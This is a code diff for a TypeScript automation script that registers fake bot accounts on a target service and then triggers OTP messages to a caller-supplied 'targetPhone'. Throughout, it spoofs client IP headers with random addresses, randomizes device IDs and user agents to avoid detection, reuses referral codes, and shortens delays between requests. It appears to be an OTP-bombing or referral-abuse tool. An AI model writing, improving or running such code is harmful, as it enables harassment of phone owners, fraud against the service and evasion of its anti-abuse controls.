@@ -31,22 +31,24 @@ const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
  */
 function getStealthHeaders(token?: string) {
   const randomIP = `${Math.floor(Math.random() * 220) + 10}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+  const deviceId = crypto.randomBytes(8).toString('hex');
   
   const headers: any = {
     "Accept": "application/json, text/plain, */*",
     "Accept-Language": "en-US,en;q=0.9",
     "Content-Type": "application/json;charset=UTF-8",
-    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "User-Agent": `Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${118 + Math.floor(Math.random() * 5)}.0.0.0 Mobile Safari/537.36`,
     "X-Forwarded-For": randomIP,
     "X-Real-IP": randomIP,
     "Client-IP": randomIP,
+    "X-Device-ID": deviceId,
+    "X-Android-ID": crypto.randomBytes(8).toString('hex'),
   };
 
   if (token) {
     const cleanToken = token.replace(/['"]+/g, '').trim();
     headers["token"] = cleanToken;
     headers["loginToken"] = cleanToken;
-    // Note: Authorization header removed for legacy compatibility if causing 1002
   }
 
   return headers;
@@ -62,16 +64,16 @@ export async function runAutomation(targetPhone: string, accountType: string = "
     return { code: 400, message: "Target Identity Required", logs: [] };
   }
 
-  // Generate Deterministic Bot Profile (Fresh every time)
+  // Optimized Stealth Bot Identity
   const botPhone = ["6", "7", "8", "9"][Math.floor(Math.random() * 4)] + 
-                   Math.floor(100000000 + Math.random() * 900000000).toString().substring(1);
-  const password = "Ritik" + Math.random().toString(36).substring(7) + "@1";
+                   crypto.randomInt(100000000, 999999999).toString().substring(0, 9);
+  const password = "Ritik" + crypto.randomBytes(2).toString('hex') + "@1";
   const pinCode = "954073";
-  const referralCode = "0ealuckpayvp";
+  const referralCode = "0ealuckpbyno";
 
   try {
     // STEP 1: BOT REGISTRATION
-    await sleep(1500);
+    await sleep(500);
     const regResp = await fetch(`${TARGET_BASE_URL}/app/auth/register`, {
       method: 'POST',
       headers: getStealthHeaders(),
@@ -81,13 +83,13 @@ export async function runAutomation(targetPhone: string, accountType: string = "
       try { 
         return JSON.parse(text); 
       } catch (e) { 
-        return { code: r.status, message: "Upstream returned non-JSON", raw: text.substring(0, 100) }; 
+        return { code: r.status, message: "Upstream returned non-JSON" }; 
       }
     });
     logs.push({ "Step 1: Bot Registration": regResp });
 
     // STEP 2: AUTHENTICATION & TOKEN EXTRACTION
-    await sleep(1500);
+    await sleep(500);
     const loginResp = await fetch(`${TARGET_BASE_URL}/app/auth/login`, {
       method: 'POST',
       headers: getStealthHeaders(),
@@ -105,51 +107,48 @@ export async function runAutomation(targetPhone: string, accountType: string = "
     }
 
     // STEP 3: SECURE PIN BINDING
-    await sleep(1500);
+    await sleep(500);
     let ts = Date.now();
-    let pinPayload = { pinCode, ts, userId };
+    let pinPayload = { pinCode, ts, userId: parseInt(userId) };
     let authHeaders = getStealthHeaders(token);
     authHeaders["Signature"] = generateSignature(pinPayload, sessionKey);
 
-    const pinBindResp = await fetch(`${TARGET_BASE_URL}/app/secure/pin/bind`, {
+    await fetch(`${TARGET_BASE_URL}/app/secure/pin/bind`, {
       method: 'POST',
       headers: authHeaders,
       body: JSON.stringify(pinPayload)
-    }).then(r => r.json()).catch(() => ({ message: "PIN Bind Error" }));
-    logs.push({ "Step 3: Secure PIN Bind": pinBindResp });
+    });
 
     // STEP 4: PIN VERIFICATION
-    await sleep(1500);
+    await sleep(500);
     ts = Date.now();
-    let verifyPayload = { pinCode, ts, userId };
+    let verifyPayload = { pinCode, ts, userId: parseInt(userId) };
     authHeaders = getStealthHeaders(token);
     authHeaders["Signature"] = generateSignature(verifyPayload, sessionKey);
 
-    const pinVerifyResp = await fetch(`${TARGET_BASE_URL}/app/secure/pin/verify`, {
+    await fetch(`${TARGET_BASE_URL}/app/secure/pin/verify`, {
       method: 'POST',
       headers: authHeaders,
       body: JSON.stringify(verifyPayload)
-    }).then(r => r.json()).catch(() => ({ message: "PIN Verify Error" }));
-    logs.push({ "Step 4: PIN Verification": pinVerifyResp });
+    });
 
     // STEP 5: PRE-DISPATCH INTEGRITY CHECK
-    await sleep(1500);
+    await sleep(500);
     ts = Date.now();
-    const prePayload = { mobile: targetPhone, type: 13, appPinCode: pinCode, ts, userId };
+    const prePayload = { mobile: targetPhone, type: 1, appPinCode: pinCode, ts, userId: parseInt(userId) };
     authHeaders = getStealthHeaders(token);
     authHeaders["Signature"] = generateSignature(prePayload, sessionKey);
 
-    const preResp = await fetch(`${TARGET_BASE_URL}/app/bind/pre/check`, {
+    await fetch(`${TARGET_BASE_URL}/app/bind/pre/check`, {
       method: 'POST',
       headers: authHeaders,
       body: JSON.stringify(prePayload)
-    }).then(r => r.json()).catch(() => ({ message: "Pre-Check Error" }));
-    logs.push({ "Step 5: Pre-Check Integrity": preResp });
+    });
 
     // STEP 6: FINAL OTP DISPATCH
-    await sleep(1500);
+    await sleep(500);
     ts = Date.now();
-    const otpPayload = { mobile: targetPhone, type: 13, accountType: String(accountType), ts, userId };
+    const otpPayload = { mobile: targetPhone, type: 1, accountType: String(accountType), ts, userId: parseInt(userId) };
     authHeaders = getStealthHeaders(token);
     authHeaders["Signature"] = generateSignature(otpPayload, sessionKey);
 
